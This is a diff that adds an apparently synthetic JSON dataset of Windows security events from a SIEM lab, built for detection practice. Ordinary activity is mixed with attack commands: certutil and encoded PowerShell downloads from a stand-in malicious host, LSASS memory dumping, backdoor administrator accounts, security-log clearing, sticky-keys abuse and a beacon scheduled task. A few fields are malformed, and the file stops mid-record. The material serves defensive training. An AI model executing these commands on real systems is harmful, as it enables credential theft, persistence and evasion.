@@ -1,0 +1,985 @@
+[
+  {
+    "EventID": 4688,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T07:52:52.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN01",
+    "User": "Inioluwa",
+    "ProcessName": "powershell.exe",
+    "ParentProcessName": "cmd.exe",
+    "CommandLine": "powershell.exe -Letter -enc VwByAGkAdABlAC0ASABvAHMAdAAgACcAVABoAHIAZQBhAHQAIABIAHUAbgB0AGkAbgBnACAATABpAHYAZQAhACcADwA="
+  },
+  {
+    "EventID": 4624,
+    "Category": "Authentication",
+    "TimeGenerated": "2026-06-01T07:52:52.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN01",
+    "User": "Emily.Davis",
+    "LogonType": 3,
+    "Description": "An account was successfully logged on."
+  },
+  {
+    "EventID": 106,
+    "Category": "Persistence",
+    "TimeGenerated": "2026-06-01T07:53:07.7537389+01:00",
+    "Computer": "SIEM-LAB-SRV01",
+    "User": "SYSTEM",
+    "TaskName": "\\Google\\GoogleUpdate\\UpdateTaskMachineUA",
+    "TaskPath": "C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe",
+    "Description": "User registered a scheduled task."
+  },
+  {
+    "EventID": 4657,
+    "Category": "Persistence",
+    "TimeGenerated": "2026-06-01T07:53:22.7537389+01:00",
+    "Computer": "SIEM-LAB-LAPTOP04",
+    "User": "Sarah.Jenkins",
+    "RegistryKey": "HKCU\\Software\\Microsoft\\Office\\16.0\\Common\\Identity",
+    "ValueName": "EnableADAL",
+    "ValueObject": "1",
+    "OperationType": "Existing Registry Value Modified"
+  },
+  {
+    "EventID": 4688,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T07:53:27.7537389+01:00",
+    "Computer": "SIEM-LAB-SRV01",
+    "User": "SYSTEM",
+    "ProcessName": "rundll32.exe",
+    "ParentProcessName": "cmd.exe",
+    "CommandLine": "rundll32.exe comsvcs.dll, MiniDump 624 C:\\Windows\\Temp\\lsass.dmp full"
+  },
+  {
+    "EventID": 4104,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T07:53:37.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN03",
+    "User": "James.Doe",
+    "ProcessName": "powershell.exe",
+    "CommandLine": "Write-Output 'System Health Check Completed Successfully.'; exit 0"
+  },
+  {
+    "EventID": 4688,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T07:53:52.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN02",
+    "User": "Inioluwa",
+    "ProcessName": "outlook.exe",
+    "ParentProcessName": "explorer.exe",
+    "CommandLine": "outlook.exe /recycle"
+  },
+  {
+    "EventID": 4625,
+    "Category": "Authentication",
+    "TimeGenerated": "2026-06-01T07:54:02.7537389+01:00",
+    "Computer": "SIEM-LAB-DC01",
+    "User": "Administrator",
+    "LogonType": 3,
+    "FailureReason": "Unknown user name or bad password.",
+    "SourceAddress": "10.0.12.14"
+  },
+  {
+    "EventID": 4624,
+    "Category": "Authentication",
+    "TimeGenerated": "2026-06-01T07:54:07.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN01",
+    "User": "John.Smith",
+    "LogonType": 11,
+    "Description": "An account was successfully logged on."
+  },
+  {
+    "EventID": 106,
+    "Category": "Persistence",
+    "TimeGenerated": "2026-06-01T07:54:22.7537389+01:00",
+    "Computer": "SIEM-LAB-SRV01",
+    "User": "SYSTEM",
+    "TaskName": "\\Microsoft\\Windows\\Defrag\\ScheduledDefrag",
+    "TaskPath": "%systemroot%\\system32\\defrag.exe",
+    "Description": "User registered a scheduled task."
+  },
+  {
+    "EventID": 4657,
+    "Category": "Persistence",
+    "TimeGenerated": "2026-06-01T07:54:37.7537389+01:00",
+    "Computer": "SIEM-LAB-LAPTOP04",
+    "User": "David.Miller",
+    "RegistryKey": "HKCU\\Software\\Microsoft\\Office\\16.0\\Common\\Identity",
+    "ValueName": "EnableADAL",
+    "ValueObject": "1",
+    "OperationType": "Existing Registry Value Modified"
+  },
+  {
+    "EventID": 4688,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T07:54:37.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN03",
+    "User": "SYSTEM",
+    "ProcessName": "sethc.exe",
+    "ParentProcessName": "winlogon.exe",
+    "CommandLine": "sethc.exe spawn cmd.exe"
+  },
+  {
+    "EventID": 4104,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T07:54:52.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN03",
+    "User": "Sarah.Jenkins",
+    "ProcessName": "powershell.exe",
+    "CommandLine": "Import-Module ActiveDirectory; Get-ADUser -Filter * -Properties DisplayName"
+  },
+  {
+    "EventID": 4688,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T07:55:07.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN02",
+    "User": "James.Doe",
+    "ProcessName": "outlook.exe",
+    "ParentProcessName": "explorer.exe",
+    "CommandLine": "outlook.exe /recycle"
+  },
+  {
+    "EventID": 4688,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T07:55:12.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN02",
+    "User": "Sarah.Jenkins",
+    "ProcessName": "certutil.exe",
+    "ParentProcessName": "powershell.exe",
+    "CommandLine": "certutil.exe -urlcache -split -f http://evil-domain.com/malware.exe C:\\Windows\\Temp\\payload.exe"
+  },
+  {
+    "EventID": 4624,
+    "Category": "Authentication",
+    "TimeGenerated": "2026-06-01T07:55:22.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN01",
+    "User": "Inioluwa",
+    "LogonType": 2,
+    "Description": "An account was successfully logged on."
+  },
+  {
+    "EventID": 106,
+    "Category": "Persistence",
+    "TimeGenerated": "2026-06-01T07:55:37.7537389+01:00",
+    "Computer": "SIEM-LAB-SRV01",
+    "User": "SYSTEM",
+    "TaskName": "\\Google\\GoogleUpdate\\UpdateTaskMachineUA",
+    "TaskPath": "C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe",
+    "Description": "User registered a scheduled task."
+  },
+  {
+    "EventID": 4688,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T07:55:47.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN01",
+    "User": "James.Doe",
+    "ProcessName": "svchost.exe",
+    "ParentProcessName": "explorer.exe",
+    "CommandLine": "C:\\Users\\Public\\Downloads\\svchost.exe --port 4444"
+  },
+  {
+    "EventID": 4657,
+    "Category": "Persistence",
+    "TimeGenerated": "2026-06-01T07:55:52.7537389+01:00",
+    "Computer": "SIEM-LAB-LAPTOP04",
+    "User": "Emily.Davis",
+    "RegistryKey": "HKCU\\Software\\Microsoft\\Office\\16.0\\Common\\Identity",
+    "ValueName": "EnableADAL",
+    "ValueObject": "1",
+    "OperationType": "Existing Registry Value Modified"
+  },
+  {
+    "EventID": 4104,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T07:56:07.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN03",
+    "User": "David.Miller",
+    "ProcessName": "powershell.exe",
+    "CommandLine": "Test-Connection -ComputerName 8.8.8.8 -Count 2 -Quiet"
+  },
+  {
+    "EventID": 4688,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T07:56:22.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN02",
+    "User": "Sarah.Jenkins",
+    "ProcessName": "outlook.exe",
+    "ParentProcessName": "explorer.exe",
+    "CommandLine": "outlook.exe /recycle"
+  },
+  {
+    "EventID": 106,
+    "Category": "Persistence",
+    "TimeGenerated": "2026-06-01T07:56:22.7537389+01:00",
+    "Computer": "SIEM-LAB-SRV01",
+    "User": "SYSTEM",
+    "TaskName": "\\Microsoft\\Windows\\CriticalUpdate\\UpdateAgent_24",
+    "TaskPath": "C:\\Windows\\Temp\\beacon.exe",
+    "CommandLine": "schtasks /create /tn CriticalUpdate /tr C:\\Windows\\Temp\\beacon.exe /sc hourly"
+  },
+  {
+    "EventID": 4624,
+    "Category": "Authentication",
+    "TimeGenerated": "2026-06-01T07:56:37.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN01",
+    "User": "James.Doe",
+    "LogonType": 3,
+    "Description": "An account was successfully logged on."
+  },
+  {
+    "EventID": 106,
+    "Category": "Persistence",
+    "TimeGenerated": "2026-06-01T07:56:52.7537389+01:00",
+    "Computer": "SIEM-LAB-SRV01",
+    "User": "SYSTEM",
+    "TaskName": "\\Microsoft\\Windows\\Defrag\\ScheduledDefrag",
+    "TaskPath": "%systemroot%\\system32\\defrag.exe",
+    "Description": "User registered a scheduled task."
+  },
+  {
+    "EventID": 4732,
+    "Category": "Account",
+    "TimeGenerated": "2026-06-01T07:56:57.7537389+01:00",
+    "Computer": "SIEM-LAB-LAPTOP04",
+    "User": "SYSTEM",
+    "TargetAccount": "backdoor_admin_23",
+    "TargetGroup": "Administrators",
+    "CommandLine": "net localgroup administrators backdoor_admin_23 /add"
+  },
+  {
+    "EventID": 4657,
+    "Category": "Persistence",
+    "TimeGenerated": "2026-06-01T07:57:07.7537389+01:00",
+    "Computer": "SIEM-LAB-LAPTOP04",
+    "User": "John.Smith",
+    "RegistryKey": "HKCU\\Software\\Microsoft\\Office\\16.0\\Common\\Identity",
+    "ValueName": "EnableADAL",
+    "ValueObject": "1",
+    "OperationType": "Existing Registry Value Modified"
+  },
+  {
+    "EventID": 4104,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T07:57:22.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN03",
+    "User": "Emily.Davis",
+    "ProcessName": "powershell.exe",
+    "CommandLine": "Get-Process | Where-Object { \\2.CPU -gt 10 } | Select-Object Name, CPU"
+  },
+  {
+    "EventID": 4720,
+    "Category": "Account",
+    "TimeGenerated": "2026-06-01T07:57:32.7537389+01:00",
+    "Computer": "SIEM-LAB-DC01",
+    "User": "SYSTEM",
+    "TargetAccount": "backdoor_admin_22",
+    "CommandLine": "net user backdoor_admin_22 TargetPass123! /add"
+  },
+  {
+    "EventID": 4688,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T07:57:37.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN02",
+    "User": "David.Miller",
+    "ProcessName": "outlook.exe",
+    "ParentProcessName": "explorer.exe",
+    "CommandLine": "outlook.exe /recycle"
+  },
+  {
+    "EventID": 4624,
+    "Category": "Authentication",
+    "TimeGenerated": "2026-06-01T07:57:52.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN01",
+    "User": "Sarah.Jenkins",
+    "LogonType": 11,
+    "Description": "An account was successfully logged on."
+  },
+  {
+    "EventID": 4688,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T07:58:07.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN02",
+    "User": "Administrator",
+    "ProcessName": "wevtutil.exe",
+    "ParentProcessName": "cmd.exe",
+    "CommandLine": "wevtutil.exe cl Security"
+  },
+  {
+    "EventID": 106,
+    "Category": "Persistence",
+    "TimeGenerated": "2026-06-01T07:58:07.7537389+01:00",
+    "Computer": "SIEM-LAB-SRV01",
+    "User": "SYSTEM",
+    "TaskName": "\\Google\\GoogleUpdate\\UpdateTaskMachineUA",
+    "TaskPath": "C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe",
+    "Description": "User registered a scheduled task."
+  },
+  {
+    "EventID": 4657,
+    "Category": "Persistence",
+    "TimeGenerated": "2026-06-01T07:58:22.7537389+01:00",
+    "Computer": "SIEM-LAB-LAPTOP04",
+    "User": "Inioluwa",
+    "RegistryKey": "HKCU\\Software\\Microsoft\\Office\\16.0\\Common\\Identity",
+    "ValueName": "EnableADAL",
+    "ValueObject": "1",
+    "OperationType": "Existing Registry Value Modified"
+  },
+  {
+    "EventID": 4104,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T07:58:37.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN03",
+    "User": "John.Smith",
+    "ProcessName": "powershell.exe",
+    "CommandLine": "Write-Output 'System Health Check Completed Successfully.'; exit 0"
+  },
+  {
+    "EventID": 4688,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T07:58:42.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN01",
+    "User": "Sarah.Jenkins",
+    "ProcessName": "powershell.exe",
+    "ParentProcessName": "cmd.exe",
+    "CommandLine": "powershell.exe -EncodedCommand aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vYmFjZ29vci5leGUnKQ=="
+  },
+  {
+    "EventID": 4688,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T07:58:52.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN02",
+    "User": "Emily.Davis",
+    "ProcessName": "outlook.exe",
+    "ParentProcessName": "explorer.exe",
+    "CommandLine": "outlook.exe /recycle"
+  },
+  {
+    "EventID": 4624,
+    "Category": "Authentication",
+    "TimeGenerated": "2026-06-01T07:59:07.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN01",
+    "User": "David.Miller",
+    "LogonType": 2,
+    "Description": "An account was successfully logged on."
+  },
+  {
+    "EventID": 4688,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T07:59:17.7537389+01:00",
+    "Computer": "SIEM-LAB-SRV01",
+    "User": "SYSTEM",
+    "ProcessName": "rundll32.exe",
+    "ParentProcessName": "cmd.exe",
+    "CommandLine": "rundll32.exe comsvcs.dll, MiniDump 624 C:\\Windows\\Temp\\lsass.dmp full"
+  },
+  {
+    "EventID": 106,
+    "Category": "Persistence",
+    "TimeGenerated": "2026-06-01T07:59:22.7537389+01:00",
+    "Computer": "SIEM-LAB-SRV01",
+    "User": "SYSTEM",
+    "TaskName": "\\Microsoft\\Windows\\Defrag\\ScheduledDefrag",
+    "TaskPath": "%systemroot%\\system32\\defrag.exe",
+    "Description": "User registered a scheduled task."
+  },
+  {
+    "EventID": 4657,
+    "Category": "Persistence",
+    "TimeGenerated": "2026-06-01T07:59:37.7537389+01:00",
+    "Computer": "SIEM-LAB-LAPTOP04",
+    "User": "James.Doe",
+    "RegistryKey": "HKCU\\Software\\Microsoft\\Office\\16.0\\Common\\Identity",
+    "ValueName": "EnableADAL",
+    "ValueObject": "1",
+    "OperationType": "Existing Registry Value Modified"
+  },
+  {
+    "EventID": 4104,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T07:59:52.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN03",
+    "User": "Inioluwa",
+    "ProcessName": "powershell.exe",
+    "CommandLine": "Import-Module ActiveDirectory; Get-ADUser -Filter * -Properties DisplayName"
+  },
+  {
+    "EventID": 4625,
+    "Category": "Authentication",
+    "TimeGenerated": "2026-06-01T07:59:52.7537389+01:00",
+    "Computer": "SIEM-LAB-DC01",
+    "User": "Administrator",
+    "LogonType": 3,
+    "FailureReason": "Unknown user name or bad password.",
+    "SourceAddress": "10.0.12.14"
+  },
+  {
+    "EventID": 4688,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T08:00:07.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN02",
+    "User": "John.Smith",
+    "ProcessName": "outlook.exe",
+    "ParentProcessName": "explorer.exe",
+    "CommandLine": "outlook.exe /recycle"
+  },
+  {
+    "EventID": 4624,
+    "Category": "Authentication",
+    "TimeGenerated": "2026-06-01T08:00:22.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN01",
+    "User": "Emily.Davis",
+    "LogonType": 3,
+    "Description": "An account was successfully logged on."
+  },
+  {
+    "EventID": 4688,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T08:00:27.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN03",
+    "User": "SYSTEM",
+    "ProcessName": "sethc.exe",
+    "ParentProcessName": "winlogon.exe",
+    "CommandLine": "sethc.exe spawn cmd.exe"
+  },
+  {
+    "EventID": 106,
+    "Category": "Persistence",
+    "TimeGenerated": "2026-06-01T08:00:37.7537389+01:00",
+    "Computer": "SIEM-LAB-SRV01",
+    "User": "SYSTEM",
+    "TaskName": "\\Google\\GoogleUpdate\\UpdateTaskMachineUA",
+    "TaskPath": "C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe",
+    "Description": "User registered a scheduled task."
+  },
+  {
+    "EventID": 4657,
+    "Category": "Persistence",
+    "TimeGenerated": "2026-06-01T08:00:52.7537389+01:00",
+    "Computer": "SIEM-LAB-LAPTOP04",
+    "User": "Sarah.Jenkins",
+    "RegistryKey": "HKCU\\Software\\Microsoft\\Office\\16.0\\Common\\Identity",
+    "ValueName": "EnableADAL",
+    "ValueObject": "1",
+    "OperationType": "Existing Registry Value Modified"
+  },
+  {
+    "EventID": 4688,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T08:01:02.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN02",
+    "User": "Emily.Davis",
+    "ProcessName": "certutil.exe",
+    "ParentProcessName": "powershell.exe",
+    "CommandLine": "certutil.exe -urlcache -split -f http://evil-domain.com/malware.exe C:\\Windows\\Temp\\payload.exe"
+  },
+  {
+    "EventID": 4104,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T08:01:07.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN03",
+    "User": "James.Doe",
+    "ProcessName": "powershell.exe",
+    "CommandLine": "Test-Connection -ComputerName 8.8.8.8 -Count 2 -Quiet"
+  },
+  {
+    "EventID": 4688,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T08:01:22.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN02",
+    "User": "Inioluwa",
+    "ProcessName": "outlook.exe",
+    "ParentProcessName": "explorer.exe",
+    "CommandLine": "outlook.exe /recycle"
+  },
+  {
+    "EventID": 4688,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T08:01:37.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN01",
+    "User": "David.Miller",
+    "ProcessName": "svchost.exe",
+    "ParentProcessName": "explorer.exe",
+    "CommandLine": "C:\\Users\\Public\\Downloads\\svchost.exe --port 4444"
+  },
+  {
+    "EventID": 4624,
+    "Category": "Authentication",
+    "TimeGenerated": "2026-06-01T08:01:37.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN01",
+    "User": "John.Smith",
+    "LogonType": 11,
+    "Description": "An account was successfully logged on."
+  },
+  {
+    "EventID": 106,
+    "Category": "Persistence",
+    "TimeGenerated": "2026-06-01T08:01:52.7537389+01:00",
+    "Computer": "SIEM-LAB-SRV01",
+    "User": "SYSTEM",
+    "TaskName": "\\Microsoft\\Windows\\Defrag\\ScheduledDefrag",
+    "TaskPath": "%systemroot%\\system32\\defrag.exe",
+    "Description": "User registered a scheduled task."
+  },
+  {
+    "EventID": 4657,
+    "Category": "Persistence",
+    "TimeGenerated": "2026-06-01T08:02:07.7537389+01:00",
+    "Computer": "SIEM-LAB-LAPTOP04",
+    "User": "David.Miller",
+    "RegistryKey": "HKCU\\Software\\Microsoft\\Office\\16.0\\Common\\Identity",
+    "ValueName": "EnableADAL",
+    "ValueObject": "1",
+    "OperationType": "Existing Registry Value Modified"
+  },
+  {
+    "EventID": 106,
+    "Category": "Persistence",
+    "TimeGenerated": "2026-06-01T08:02:12.7537389+01:00",
+    "Computer": "SIEM-LAB-SRV01",
+    "User": "SYSTEM",
+    "TaskName": "\\Microsoft\\Windows\\CriticalUpdate\\UpdateAgent_14",
+    "TaskPath": "C:\\Windows\\Temp\\beacon.exe",
+    "CommandLine": "schtasks /create /tn CriticalUpdate /tr C:\\Windows\\Temp\\beacon.exe /sc hourly"
+  },
+  {
+    "EventID": 4104,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T08:02:22.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN03",
+    "User": "Sarah.Jenkins",
+    "ProcessName": "powershell.exe",
+    "CommandLine": "Get-Process | Where-Object { \\2.CPU -gt 10 } | Select-Object Name, CPU"
+  },
+  {
+    "EventID": 4688,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T08:02:37.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN02",
+    "User": "James.Doe",
+    "ProcessName": "outlook.exe",
+    "ParentProcessName": "explorer.exe",
+    "CommandLine": "outlook.exe /recycle"
+  },
+  {
+    "EventID": 4732,
+    "Category": "Account",
+    "TimeGenerated": "2026-06-01T08:02:47.7537389+01:00",
+    "Computer": "SIEM-LAB-LAPTOP04",
+    "User": "SYSTEM",
+    "TargetAccount": "backdoor_admin_13",
+    "TargetGroup": "Administrators",
+    "CommandLine": "net localgroup administrators backdoor_admin_13 /add"
+  },
+  {
+    "EventID": 4624,
+    "Category": "Authentication",
+    "TimeGenerated": "2026-06-01T08:02:52.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN01",
+    "User": "Inioluwa",
+    "LogonType": 2,
+    "Description": "An account was successfully logged on."
+  },
+  {
+    "EventID": 106,
+    "Category": "Persistence",
+    "TimeGenerated": "2026-06-01T08:03:07.7537389+01:00",
+    "Computer": "SIEM-LAB-SRV01",
+    "User": "SYSTEM",
+    "TaskName": "\\Google\\GoogleUpdate\\UpdateTaskMachineUA",
+    "TaskPath": "C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe",
+    "Description": "User registered a scheduled task."
+  },
+  {
+    "EventID": 4720,
+    "Category": "Account",
+    "TimeGenerated": "2026-06-01T08:03:22.7537389+01:00",
+    "Computer": "SIEM-LAB-DC01",
+    "User": "SYSTEM",
+    "TargetAccount": "backdoor_admin_12",
+    "CommandLine": "net user backdoor_admin_12 TargetPass123! /add"
+  },
+  {
+    "EventID": 4657,
+    "Category": "Persistence",
+    "TimeGenerated": "2026-06-01T08:03:22.7537389+01:00",
+    "Computer": "SIEM-LAB-LAPTOP04",
+    "User": "Emily.Davis",
+    "RegistryKey": "HKCU\\Software\\Microsoft\\Office\\16.0\\Common\\Identity",
+    "ValueName": "EnableADAL",
+    "ValueObject": "1",
+    "OperationType": "Existing Registry Value Modified"
+  },
+  {
+    "EventID": 4104,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T08:03:37.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN03",
+    "User": "David.Miller",
+    "ProcessName": "powershell.exe",
+    "CommandLine": "Write-Output 'System Health Check Completed Successfully.'; exit 0"
+  },
+  {
+    "EventID": 4688,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T08:03:52.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN02",
+    "User": "Sarah.Jenkins",
+    "ProcessName": "outlook.exe",
+    "ParentProcessName": "explorer.exe",
+    "CommandLine": "outlook.exe /recycle"
+  },
+  {
+    "EventID": 4688,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T08:03:57.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN02",
+    "User": "Administrator",
+    "ProcessName": "wevtutil.exe",
+    "ParentProcessName": "cmd.exe",
+    "CommandLine": "wevtutil.exe cl Security"
+  },
+  {
+    "EventID": 4624,
+    "Category": "Authentication",
+    "TimeGenerated": "2026-06-01T08:04:07.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN01",
+    "User": "James.Doe",
+    "LogonType": 3,
+    "Description": "An account was successfully logged on."
+  },
+  {
+    "EventID": 106,
+    "Category": "Persistence",
+    "TimeGenerated": "2026-06-01T08:04:22.7537389+01:00",
+    "Computer": "SIEM-LAB-SRV01",
+    "User": "SYSTEM",
+    "TaskName": "\\Microsoft\\Windows\\Defrag\\ScheduledDefrag",
+    "TaskPath": "%systemroot%\\system32\\defrag.exe",
+    "Description": "User registered a scheduled task."
+  },
+  {
+    "EventID": 4688,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T08:04:32.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN01",
+    "User": "Emily.Davis",
+    "ProcessName": "powershell.exe",
+    "ParentProcessName": "cmd.exe",
+    "CommandLine": "powershell.exe -e Q2xlYXItRXZlbnRMb2cgLVNlY3VyaXR5"
+  },
+  {
+    "EventID": 4657,
+    "Category": "Persistence",
+    "TimeGenerated": "2026-06-01T08:04:37.7537389+01:00",
+    "Computer": "SIEM-LAB-LAPTOP04",
+    "User": "John.Smith",
+    "RegistryKey": "HKCU\\Software\\Microsoft\\Office\\16.0\\Common\\Identity",
+    "ValueName": "EnableADAL",
+    "ValueObject": "1",
+    "OperationType": "Existing Registry Value Modified"
+  },
+  {
+    "EventID": 4104,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T08:04:52.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN03",
+    "User": "Emily.Davis",
+    "ProcessName": "powershell.exe",
+    "CommandLine": "Import-Module ActiveDirectory; Get-ADUser -Filter * -Properties DisplayName"
+  },
+  {
+    "EventID": 4688,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T08:05:07.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN02",
+    "User": "David.Miller",
+    "ProcessName": "outlook.exe",
+    "ParentProcessName": "explorer.exe",
+    "CommandLine": "outlook.exe /recycle"
+  },
+  {
+    "EventID": 4688,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T08:05:07.7537389+01:00",
+    "Computer": "SIEM-LAB-SRV01",
+    "User": "SYSTEM",
+    "ProcessName": "rundll32.exe",
+    "ParentProcessName": "cmd.exe",
+    "CommandLine": "rundll32.exe comsvcs.dll, MiniDump 624 C:\\Windows\\Temp\\lsass.dmp full"
+  },
+  {
+    "EventID": 4624,
+    "Category": "Authentication",
+    "TimeGenerated": "2026-06-01T08:05:22.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN01",
+    "User": "Sarah.Jenkins",
+    "LogonType": 11,
+    "Description": "An account was successfully logged on."
+  },
+  {
+    "EventID": 106,
+    "Category": "Persistence",
+    "TimeGenerated": "2026-06-01T08:05:37.7537389+01:00",
+    "Computer": "SIEM-LAB-SRV01",
+    "User": "SYSTEM",
+    "TaskName": "\\Google\\GoogleUpdate\\UpdateTaskMachineUA",
+    "TaskPath": "C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe",
+    "Description": "User registered a scheduled task."
+  },
+  {
+    "EventID": 4625,
+    "Category": "Authentication",
+    "TimeGenerated": "2026-06-01T08:05:42.7537389+01:00",
+    "Computer": "SIEM-LAB-DC01",
+    "User": "Administrator",
+    "LogonType": 3,
+    "FailureReason": "Unknown user name or bad password.",
+    "SourceAddress": "10.0.12.14"
+  },
+  {
+    "EventID": 4657,
+    "Category": "Persistence",
+    "TimeGenerated": "2026-06-01T08:05:52.7537389+01:00",
+    "Computer": "SIEM-LAB-LAPTOP04",
+    "User": "Inioluwa",
+    "RegistryKey": "HKCU\\Software\\Microsoft\\Office\\16.0\\Common\\Identity",
+    "ValueName": "EnableADAL",
+    "ValueObject": "1",
+    "OperationType": "Existing Registry Value Modified"
+  },
+  {
+    "EventID": 4104,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T08:06:07.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN03",
+    "User": "John.Smith",
+    "ProcessName": "powershell.exe",
+    "CommandLine": "Test-Connection -ComputerName 8.8.8.8 -Count 2 -Quiet"
+  },
+  {
+    "EventID": 4688,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T08:06:17.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN03",
+    "User": "SYSTEM",
+    "ProcessName": "sethc.exe",
+    "ParentProcessName": "winlogon.exe",
+    "CommandLine": "sethc.exe spawn cmd.exe"
+  },
+  {
+    "EventID": 4688,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T08:06:22.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN02",
+    "User": "Emily.Davis",
+    "ProcessName": "outlook.exe",
+    "ParentProcessName": "explorer.exe",
+    "CommandLine": "outlook.exe /recycle"
+  },
+  {
+    "EventID": 4624,
+    "Category": "Authentication",
+    "TimeGenerated": "2026-06-01T08:06:37.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN01",
+    "User": "David.Miller",
+    "LogonType": 2,
+    "Description": "An account was successfully logged on."
+  },
+  {
+    "EventID": 106,
+    "Category": "Persistence",
+    "TimeGenerated": "2026-06-01T08:06:52.7537389+01:00",
+    "Computer": "SIEM-LAB-SRV01",
+    "User": "SYSTEM",
+    "TaskName": "\\Microsoft\\Windows\\Defrag\\ScheduledDefrag",
+    "TaskPath": "%systemroot%\\system32\\defrag.exe",
+    "Description": "User registered a scheduled task."
+  },
+  {
+    "EventID": 4688,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T08:06:52.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN02",
+    "User": "Inioluwa",
+    "ProcessName": "certutil.exe",
+    "ParentProcessName": "powershell.exe",
+    "CommandLine": "certutil.exe -urlcache -split -f http://evil-domain.com/malware.exe C:\\Windows\\Temp\\payload.exe"
+  },
+  {
+    "EventID": 4657,
+    "Category": "Persistence",
+    "TimeGenerated": "2026-06-01T08:07:07.7537389+01:00",
+    "Computer": "SIEM-LAB-LAPTOP04",
+    "User": "James.Doe",
+    "RegistryKey": "HKCU\\Software\\Microsoft\\Office\\16.0\\Common\\Identity",
+    "ValueName": "EnableADAL",
+    "ValueObject": "1",
+    "OperationType": "Existing Registry Value Modified"
+  },
+  {
+    "EventID": 4104,
+    "Category": "Process",
+    "TimeGenerated": "2026-06-01T08:07:22.7537389+01:00",
+    "Computer": "SIEM-LAB-WKSTN03",
+    "User": "Inioluwa",
+    "ProcessName": "powershell.exe",
